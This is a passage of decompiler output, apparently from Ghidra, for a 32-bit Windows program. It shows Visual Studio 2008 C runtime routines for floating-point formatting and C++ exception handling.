    _memmove(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cropzeros
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  char *_Dst;
  int iVar6;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar6 = 0x16;
  }
  else {
    iVar6 = param_2;
    if (param_2 < 1) {
      iVar6 = 0;
    }
    if (iVar6 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      puVar5 = puVar4;
      if (0 < param_2) {
        puVar5 = puVar4 + 1;
        *puVar4 = *puVar5;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,s_e_000_00420464);
      if (eVar2 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar6 = param_4[1] + -1;
          if (iVar6 < 0) {
            iVar6 = -iVar6;
            _Dst[1] = '-';
          }
          if (99 < iVar6) {
            iVar3 = iVar6 / 100;
            iVar6 = iVar6 % 100;
            _Dst[2] = _Dst[2] + (char)iVar3;
          }
          if (9 < iVar6) {
            iVar3 = iVar6 / 10;
            iVar6 = iVar6 % 10;
            _Dst[3] = _Dst[3] + (char)iVar3;
          }
          _Dst[4] = _Dst[4] + (char)iVar6;
        }
        if (((DAT_00424fcc & 1) != 0) && (_Dst[2] == '0')) {
          _memmove(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    piVar1 = __errno();
    iVar6 = 0x22;
  }
  *piVar1 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar6;
}



// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftoe_l(double *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_00417a1c:
    *piVar2 = iVar15;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_00417a1c;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar3;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar3;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_00417d40;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = ***(char ***)(local_28[0] + 0xbc);
  }
  if (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_00417cef:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_00417cfa;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_00417cef;
LAB_00417cfa:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_00417d40:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2008 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  undefined *puVar3;
  undefined4 uVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      puVar3 = (undefined *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this);
      *puVar3 = 0x30;
      puVar3[1] = 0;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      __shift();
      *(undefined *)this = 0x30;
      puVar3 = (undefined *)((int)this + 1);
    }
    else {
      puVar3 = (undefined *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      __shift();
      *puVar3 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(puVar3 + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftof_l(double *param_1,undefined *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == -1) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftog_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  char *pcVar4;
  _strflt local_34;
  int local_24;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_34,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_24 = local_34.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_34.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_34.sign == 0x2d),_SizeInBytes,param_4,&local_34);
    if (eVar3 == 0) {
      local_34.decpt = local_34.decpt + -1;
      if ((local_34.decpt < -4) || ((int)param_4 <= local_34.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_34.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_34.sign == 0x2d);
        if (local_24 < local_34.decpt) {
          do {
            pcVar4 = pcVar1;
            pcVar1 = pcVar4 + 1;
          } while (*pcVar4 != '\0');
          pcVar4[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2008 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __ms_p5_test_fdiv
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __ms_p5_test_fdiv(void)

{
  double dVar1;
  
  dVar1 = _DAT_00420470 - (_DAT_00420470 / _DAT_00420478) * _DAT_00420478;
  if (1.0 < dVar1 != NAN(dVar1)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __ms_p5_mp_test_fdiv
// 
// Library: Visual Studio 2008 Release

void __ms_p5_mp_test_fdiv(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA(s_KERNEL32_0042049c);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_GAIsProcessorFeaturePresent_0042047e + 2);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(0);
      return;
    }
  }
  __ms_p5_test_fdiv();
  return;
}



// Library Function - Single Match
//  public: __thiscall std::bad_exception::bad_exception(char const *)
// 
// Library: Visual Studio 2008 Release

bad_exception * __thiscall std::bad_exception::bad_exception(bad_exception *this,char *param_1)

{
  exception::exception((exception *)this,&param_1);
  *(undefined ***)this = &PTR_FUN_004204b0;
  return this;
}



undefined4 * __thiscall FUN_00418166(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_004204b0;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00409875(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_004181e5:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_004181c4:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_004181e5;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_004181c4;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  _ptiddata p_Var1;
  
  if (**param_1 == -0x1fbcb0b3) {
    p_Var1 = __getptd();
    if (0 < p_Var1->_ProcessingThrow) {
      p_Var1 = __getptd();
      p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
    }
  }
  else if (**param_1 == -0x1f928c9d) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = 0;
    terminate();
    return p_Var1;
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2008 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar4 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar4 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar4 != param_4) {
    if ((iVar4 < 0) || (*(int *)(param_3 + 4) <= iVar4)) {
      _inconsistency();
    }
    iVar2 = iVar4 * 8;
    piVar3 = (int *)(*(int *)(param_3 + 8) + iVar2);
    iVar4 = *piVar3;
    if (piVar3[1] != 0) {
      *(int *)(param_1 + 8) = iVar4;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar2),param_1,0x103);
    }
  }
  FUN_004182fb();
  if (iVar4 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar4;
  return;
}



void FUN_004182fb(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2008 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2008 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_00418454(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  unexpected();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420d60;
  uStack_c = 0x4184a9;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_004185c3();
  return local_20;
}



void FUN_004185c3(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2008 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          _memmove(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        _memmove(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_004186be;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
